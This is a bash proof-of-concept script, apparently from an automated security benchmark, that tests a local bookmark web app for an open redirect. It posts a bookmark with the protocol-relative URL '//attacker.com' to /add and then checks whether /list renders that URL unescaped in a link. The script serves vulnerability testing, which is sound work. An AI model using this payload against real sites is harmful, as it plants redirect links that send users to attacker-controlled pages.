#!/bin/bash
# POC: Demonstrates Open Redirect vulnerability via protocol-relative URLs stored in bookmarks and rendered in list page
# Target: ./repo
# Created: 2025-11-07T17:41:59.163Z
# Session: benchmark-XBEN-075-24-mhp4u83c

# Open Redirect POC via Protocol-Relative URL Storage and Rendering
# Tests the /add endpoint for protocol-relative URL handling and /list for vulnerable rendering

TARGET="http://localhost:5000"
COOKIES="/tmp/cookies_openredirect.txt"

echo "[*] Testing Open Redirect via Protocol-Relative URL"
echo "[*] Target: $TARGET"
echo ""

# Step 1: Visit the list page to establish session
echo "[*] Step 1: Establishing session via /list endpoint"
curl -s -c "$COOKIES" "$TARGET/list" > /dev/null
echo "[+] Session established"
echo ""

# Step 2: Submit a bookmark with protocol-relative URL
echo "[*] Step 2: Submitting bookmark with protocol-relative URL (//attacker.com)"
curl -s -b "$COOKIES" -X POST "$TARGET/add" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=Attacker Site&url=//attacker.com" \
  -c "$COOKIES" > /dev/null
echo "[+] Bookmark submitted"
echo ""

# Step 3: Retrieve the list page and check if protocol-relative URL is stored and rendered
echo "[*] Step 3: Retrieving /list page to verify vulnerable rendering"
RESPONSE=$(curl -s -b "$COOKIES" "$TARGET/list")

# Check if the protocol-relative URL is present in href attribute
if echo "$RESPONSE" | grep -q 'href="//attacker.com"'; then
    echo "[+] VULNERABLE: Protocol-relative URL stored and rendered unescaped"
    echo "[+] Found in response:"
    echo "$RESPONSE" | grep -o 'href="//attacker.com"'
    echo ""
    echo "[+] Full link element:"
    echo "$RESPONSE" | grep -oP '(<a[^>]*href="//attacker\.com"[^>]*>.*?</a>|href="//attacker\.com")'
    echo ""
    echo "[*] When a user clicks this link:"
    echo "    - The URL //attacker.com is interpreted as protocol-relative"
    echo "    - Browser inherits protocol from current page (HTTP or HTTPS)"
    echo "    - User is redirected to attacker.com using the same protocol"
    echo "    - This is an Open Redirect vulnerability"
    exit 0
else
    echo "[-] SECURE: Protocol-relative URL was not found or was escaped"
    echo "[*] Response body (first 500 chars):"
    echo "$RESPONSE" | head -c 500
    exit 1
fi